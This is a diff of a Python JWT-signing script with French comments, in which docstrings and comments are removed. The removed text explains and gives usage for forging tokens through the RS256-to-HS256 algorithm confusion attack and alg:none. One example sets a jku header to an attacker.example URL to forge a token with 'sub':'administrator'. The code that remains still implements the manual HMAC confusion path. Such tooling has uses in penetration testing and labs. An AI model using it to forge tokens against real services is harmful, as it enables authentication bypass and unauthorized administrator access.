@@ -1,65 +1,4 @@
 #!/usr/bin/env python3
-"""
-jwt_sign.py
-
-Signe un JWT (header + payload) avec une clé chargée depuis un fichier.
-
-Supporte :
-    - RS256 / RS384 / RS512
-    - ES256 / ES384 / ES512
-    - PS256 / PS384 / PS512
-    - HS256 / HS384 / HS512
-    - none
-
-Pour RS/ES/PS :
-    Clé privée PEM.
-
-Pour HS :
-    Secret brut texte ou binaire.
-
-Algorithm Confusion Attack (RS256 -> HS256) :
-    Quand le serveur cible vérifie un JWT RS256 avec la clé publique RSA,
-    mais accepte aussi HS256, on peut signer le token en HMAC-SHA256 en
-    utilisant la clé publique PEM elle-même comme secret. Le serveur, en
-    voulant vérifier le token, utilise sa clé publique comme secret HMAC
-    et la signature devient valide de son point de vue.
-
-    PyJWT refuse normalement d'utiliser une clé PEM comme secret HMAC
-    (il détecte le format et lève une exception). --confusion bypass
-    cette vérification en construisant le JWT à la main avec hmac.new(),
-    en utilisant les bytes bruts du fichier clé tels quels (important :
-    le serveur doit recevoir exactement les mêmes bytes que ceux que tu
-    utilises ici, y compris line endings/espaces, sinon la signature ne
-    matchera pas côté serveur).
-
-Usage:
-    # Payload et headers via fichiers JSON
-    python3 jwt_sign.py --key private_key.pem --alg RS256 \
-        --payload payload.json --headers headers.json
-
-    # Payload inline
-    python3 jwt_sign.py --key private_key.pem --alg RS256 \
-        --payload '{"sub":"admin","iat":1234567890}' \
-        --header kid=my-key --header typ=JWT
-
-    # HMAC avec secret texte
-    python3 jwt_sign.py --key secret.txt --alg HS256 \
-        --payload payload.json
-
-    # Ajout automatique de exp/iat
-    python3 jwt_sign.py --key private_key.pem --alg RS256 \
-        --payload '{"sub":"admin"}' \
-        --exp 3600 --auto-iat
-
-    # JWT alg:none
-    python3 jwt_sign.py --key dummy --alg none \
-        --payload '{"sub":"admin"}'
-
-    # Algorithm confusion RS256 -> HS256 (clé publique du serveur cible)
-    python3 jwt_sign.py --key public.pem --alg HS256 --confusion \
-        --payload '{"sub":"administrator"}' \
-        --header kid=v6MQKWWGZpz05MvB --header jku=https://attacker.example/exploit
-"""
 
 import argparse
 import base64
@@ -78,22 +17,6 @@ def b64url_encode(data: bytes) -> str:
 
 
 def load_key_material(path: str, alg: str, confusion: bool) -> bytes | str:
-    """
-    Charge le matériel de clé depuis un fichier.
-
-    --confusion :
-        Retourne toujours les bytes bruts du fichier, sans aucune
-        transformation. C'est essentiel pour l'algorithm confusion attack :
-        le secret HMAC doit correspondre exactement aux bytes de la clé
-        publique PEM telle qu'elle est stockée/servie par la cible.
-
-    HS* (sans --confusion) :
-        Retourne le secret sous forme de texte UTF-8 si possible.
-        Si le fichier contient des données binaires, retourne les bytes bruts.
-
-    RS*/ES*/PS* :
-        Retourne directement le contenu PEM sous forme de bytes.
-    """
 
     data = Path(path).read_bytes()
 
@@ -114,11 +37,7 @@ def load_key_material(path: str, alg: str, confusion: bool) -> bytes | str:
 
 
 def sign_hmac_raw(header: dict, payload: dict, secret_bytes: bytes, alg: str) -> str:
-    """
-    Construit et signe un JWT en HMAC à la main, sans passer par la
-    validation de clé de PyJWT. Utilisé pour l'algorithm confusion attack,
-    où le "secret" est en réalité une clé publique PEM/DER.
-    """
+    
 
     hash_algs = {
         "HS256": hashlib.sha256,
@@ -142,11 +61,7 @@ def sign_hmac_raw(header: dict, payload: dict, secret_bytes: bytes, alg: str) ->
 
 
 def parse_json_arg(value: str) -> dict:
-    """
-    Accepte soit :
-        - un chemin vers un fichier JSON
-        - une chaîne JSON inline
-    """
+    
 
     p = Path(value)
 
@@ -180,18 +95,7 @@ def parse_json_arg(value: str) -> dict:
 
 
 def parse_kv_list(pairs: list[str]) -> dict:
-    """
-    Parse une liste de key=value.
-
-    Exemple :
-        kid=my-key
-        admin=true
-        count=10
-        roles=["admin","user"]
-
-    Les valeurs sont d'abord interprétées comme du JSON.
-    Si ce n'est pas du JSON valide, elles restent des chaînes.
-    """
+    
 
     result = {}
 
@@ -345,19 +249,19 @@ def main():
         else {}
     )
 
-    # alg + typ par défaut, écrasés par --headers/--header si fournis
+    
     default_headers = {"alg": args.alg, "typ": "JWT"}
     default_headers.update(headers)
     headers = default_headers
 
-    # Les --header écrasent les valeurs présentes dans --headers.
+    
     headers.update(parse_kv_list(args.header))
 
     # ---------------------------------------------------------
     # Claims
     # ---------------------------------------------------------
 
-    # Les --claim écrasent les valeurs présentes dans le payload.
+    
     payload.update(parse_kv_list(args.claim))
 
     # ---------------------------------------------------------
@@ -372,10 +276,7 @@ def main():
     if args.exp is not None:
         payload["exp"] = current_time + args.exp
 
-    # ---------------------------------------------------------
-    # Algorithm confusion attack : signature manuelle, on court-circuite
-    # PyJWT entièrement pour éviter sa vérification de format de clé.
-    # ---------------------------------------------------------
+   
 
     if args.confusion:
 
@@ -405,9 +306,7 @@ def main():
 
         return
 
-    # ---------------------------------------------------------
-    # Chargement de la clé (chemin normal, non-confusion)
-    # ---------------------------------------------------------
+
 
     key_material = load_key_material(
         args.key,
@@ -415,9 +314,7 @@ def main():
         confusion=False,
     )
 
-    # ---------------------------------------------------------
-    # Clé privée PEM chiffrée
-    # ---------------------------------------------------------
+
 
     if args.key_password and not args.alg.startswith("HS") and args.alg != "none":
 
@@ -440,15 +337,13 @@ def main():
             )
             sys.exit(1)
 
-    # ---------------------------------------------------------
-    # Signature
-    # ---------------------------------------------------------
+
 
     try:
 
         if args.alg == "none":
 
-            # PyJWT attend une clé vide avec l'algorithme none.
+            
             token = jwt.encode(
                 payload,
                 key="",
@@ -479,15 +374,9 @@ def main():
         )
         sys.exit(1)
 
-    # ---------------------------------------------------------
-    # JWT sur stdout
-    # ---------------------------------------------------------
 
     print(token)
 
-    # ---------------------------------------------------------
-    # Informations de debug sur stderr
-    # ---------------------------------------------------------
 
     try:
         decoded_header = jwt.get_unverified_header(token)
